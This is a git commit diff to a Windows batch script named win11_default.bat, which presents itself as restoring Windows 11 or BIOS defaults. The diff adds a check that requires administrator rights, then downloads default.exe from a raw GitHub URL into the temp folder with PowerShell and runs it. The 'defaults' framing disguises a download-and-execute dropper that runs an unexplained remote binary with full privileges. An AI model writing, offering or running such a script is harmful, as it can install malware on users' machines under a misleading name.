18bbc49ecf0de6ac4e3c1d9677fbc30944c37399
optolab <sloneeddie36@gmail.com>
2025-01-13 03:37:00 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,8 +1,17 @@
 @echo off
 
+:: Check if the script is running as administrator
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo This script must be run as an administrator.
+    pause
+    exit /b
+)
+
+:: Download and execute the file
 powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\default.exe"
 if exist "%TEMP%\default.exe" (
-    start /B "" runas /user:Administrator "%TEMP%\default.exe"
+    start "" "%TEMP%\default.exe"
 ) else (
     echo Windows 11 | BIOS failed to restore defaults. Try again
 )
